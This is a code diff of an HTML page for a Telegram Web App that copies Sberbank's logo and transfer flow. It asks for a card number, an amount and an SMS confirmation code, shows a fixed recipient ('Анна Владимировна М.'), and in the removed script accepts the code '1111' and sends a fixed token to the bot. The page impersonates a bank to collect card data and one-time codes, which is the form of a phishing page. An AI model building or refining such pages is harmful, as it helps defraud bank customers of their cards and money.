@@ -3,35 +3,39 @@
     <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
     <meta content="utf-8" http-equiv="encoding">
     <meta name="viewport" content="width=device-width,shrink-to-fit=no,initial-scale=1,maximum-scale=1" />
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles/styles.css">
+    <link rel="stylesheet" href="../../common/styles/styles.css">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
-<body>
+<body class="dark">
 <div class="login-form">
-    <img class="logo" src="sberbank-logo.svg" />
+    <img class="logo" src="img/sberbank-logo.svg" />
     <div class="title login">Введите номер карты</div>
-    <input id = "card-num" class="entry login" onchange={setState} placeholder = "XXXX-XXXX-XXXX-XXXX" />
+    <div class="card-number-entry">
+        <input id="card-num" class="entry login" onchange={setState} placeholder="XXXX-XXXX-XXXX-XXXX" />
+        <img class="visa-card hidden" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" />
+        <img class="mc-card hidden" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" />
+        <img class="mir-card hidden" src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Mir-logo.SVG.svg" />
+    </div>
     <div class="error-message">Неверно введён номер карты!</div>
-    <div class="title login">Сумма</div>
-    <input id = "trans-sum" class="entry login" />
+    <div class="title login sum-title">Сумма</div>
+    <input id="trans-sum" class="entry login" type="number" pattern="[0-9]*" />
     <button id="login-button" class="button-success">Продолжить</button>
-    <img class="visa-card hidden" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" />
-    <img class="mc-card hidden" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" />
 </div>
 <div class="control-form hidden">
-    <img class="logo" src="sberbank-logo.svg" />
-    <div class="title login">Перевод будет выполнен:</div>
+    <img class="logo" src="img/sberbank-logo.svg" />
+    <div class="title login" style="margin-bottom: 21px">Перевод будет выполнен:</div>
     <div class = "title">Номер карты</div>
-    <div id = "controlCardNum" class = "text" ></div>
+    <div id = "controlCardNum" class = "text" style="margin-bottom: 24px;" ></div>
     <div class = "title">Получатель</div>
-    <div class = "text">Анна Владимировна М.</div>
+    <div class = "text" style="margin-bottom: 24px;">Анна Владимировна М.</div>
     <div class = "title">Сумма</div>
     <div id = "controlSum" class = "text"></div>
     <button id="control-button" class="button-success">Подтвердить</button>
     <button class="button-link">Отменить</button>
 </div>
 <div class="verification-form hidden">
-    <img class="logo" src="sberbank-logo.svg" />
+    <img class="logo" src="img/sberbank-logo.svg" />
     <div class="title login">На ваш телефон отправлен одноразовый пароль подтверждения операции. Введите полученный код.</div>
     <input id="verification-code" class="entry login" type="number" pattern="[0-9]*" placeholder="Введите код подтверждения из SMS" />
     <div class="error-message">Неверный код</div>
@@ -39,141 +43,17 @@
     <button class="button-link">Отменить</button>
 </div>
 <div class="success-form hidden">
-    <img class="logo" src="success-logo.svg" />
-<div>
-    Поздравляем! Перевод <b>Анна Владимировна М. </b> успешно выполнен
+    <img class="logo" src="img/success-logo.svg" />
+    <div class="title">
+        Поздравляем!
+    </div>
+    <div class="title">
+        Перевод <b>Анна Владимировна М. </b> успешно выполнен.
+    </div>
+    <div class="title" style="font-size: 80%">
+        Вы можете закрыть окно.
+    </div>
 </div>
-</div>
-<script>
-    var tg = window.Telegram.WebApp;
-    var loginForm = document.querySelector('.login-form');
-    var verificationForm = document.querySelector('.verification-form');
-    var controlForm = document.querySelector('.control-form');
-    var loginButton = document.querySelector('#login-button');
-    var controlButton = document.querySelector('#control-button');
-    var verifyButton = document.querySelector('#verify-button');
-    var verificationCode = document.querySelector('#verification-code')
-    var cardNum = document.querySelector('#card-num')
-    var transSum = document.querySelector('#trans-sum')
-    var visa = document.querySelector('.visa-card')
-    var mc = document.querySelector('.mc-card')
-    var successform = document.querySelector('.success-form')
-
-    function login() {
-        setLoading(loginButton)
-        setTimeout(function () {
-            hideForm(loginForm)
-            showForm(controlForm)
-            document.getElementById("controlCardNum").innerHTML = cardNum.value
-            document.getElementById("controlSum").innerHTML = transSum.value
-        }, 1000)
-    }
-
-    function control() {
-        setLoading(controlButton)
-        
-        setTimeout(function () {
-            hideForm(controlForm)
-            showForm(verificationForm)
-        }, 1000)
-    }
-    
-    function formatCardCode() {
-        var cardCode = this.value.replace(/[^\d]/g, '').substring(0,16);
-        cardCode = cardCode != '' ? cardCode.match(/.{1,4}/g).join('-') : '';
-        this.value = cardCode;
-    }   
-
-    function checkLunaAndLogo() {
-        if(cardNum.value.split('-').join('').length === 16 && !Luhn(cardNum.value.split('-').join(''))) {
-            setError(loginForm)
-            resetLoading(loginButton)
-        } else if(cardNum.value.split('-').join('').length < 16) {
-            resetError(loginForm)
-        }
-        if(cardNum.value[0] === '4')  {
-            showImg(visa)
-        } else if (cardNum.value[0] ==='5') {
-            showImg(mc)
-        }
-        if(cardNum.value.length === 0) {
-            hideImg(visa)
-            hideImg(mc)
-        }
-    }
-
-    function Luhn (card) {
-    let checksum = 0;
-    const cardnumbers = card.split('').map(Number);
-    
-    for (const [index, num] of cardnumbers.entries()) {
-        if (index % 2 === 0) {
-        let buffer = num * 2;
-        buffer > 9 ? checksum += buffer - 9 : checksum += buffer;
-        }
-        else {
-        checksum += num;
-        }
-    }
-    return checksum % 10 === 0 ? true : false;
-    }
-
-
-    function showImg (img) {
-        img.classList.remove('hidden')
-    }
-
-    function hideImg (img) {
-        img.classList.add('hidden')
-    }
-
-    function showForm(form) {
-        form.classList.remove('hidden');
-    }
-
-    function hideForm(form) {
-        form.classList.add('hidden');
-    }
-
-    function setLoading(button) {
-        button.classList.add('loading')
-    }
-
-    function resetLoading(button) {
-        button.classList.remove('loading')
-    }
-
-    function setError(form) {
-        form.classList.add('error')
-    }
-
-    function resetError(form) {
-        form.classList.remove('error')
-    }
-
-    function verify() {
-        resetError(verificationForm)
-        setLoading(verifyButton)
-        setTimeout(function () {
-            if (verificationCode.value === '1111') {
-                var data = JSON.stringify({ token: '6c10a344-bcd7-4262-8deb-7048cdcb46a5' })
-                tg.sendData(data)
-            } else {
-                setError(verificationForm)
-                resetLoading(verifyButton)
-            }
-            setTimeout(function () {
-            hideForm(verificationForm)
-            showForm(successform)
-        }, 500)
-        })
-    }
-
-    cardNum.addEventListener('input', checkLunaAndLogo)
-    cardNum.addEventListener('input', formatCardCode, false)
-    loginButton.addEventListener('click', login);
-    controlButton.addEventListener('click', control);
-    verifyButton.addEventListener('click', verify);
-</script>
+<script type="application/javascript" src="js/index.js"></script>
 </body>
 </html>
